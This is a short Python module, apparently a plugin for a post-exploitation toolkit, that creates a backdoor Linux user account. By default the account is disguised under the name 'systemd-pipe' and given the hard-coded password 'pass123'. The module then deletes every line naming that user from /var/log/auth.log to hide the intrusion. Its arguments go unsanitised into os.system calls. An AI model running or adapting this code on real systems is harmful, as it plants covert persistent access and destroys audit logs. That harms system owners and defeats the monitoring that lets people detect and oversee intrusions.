#!/usr/bin/python3
#[PrivEsc] Create New User
#username,no,Username for created user
#password,no,Password for created user
#uid,no,UID for created user
#system,no,Create system user (yes/no)
#END

import os

def create_command_string(arguments):
    command_string = "useradd "
    
    if arguments[3] == "yes":
        command_string += "--system "
    
    if arguments[1] == "":
        command_string += "--password $(openssl passwd -6 pass123) " #password = pass123
    else:
        command_string += "--password $(openssl passwd -6 " + arguments[1] + ") "
    
    if arguments[2] != "":
        command_string += "--uid " + str(arguments[2]) + " "
    
    if arguments[0] == "":
        command_string += "systemd-pipe"
    else:
        command_string += arguments[0]

    return command_string

def clear_logs(arguments):
    if arguments[0] != "":
        os.system("sed -i '/name=" + arguments[0] + "/d' /var/log/auth.log")
    else:
        os.system("sed -i '/name=systemd-pipe/d' /var/log/auth.log")

def main(arguments):
    os.system(create_command_string(arguments))
    clear_logs(arguments)
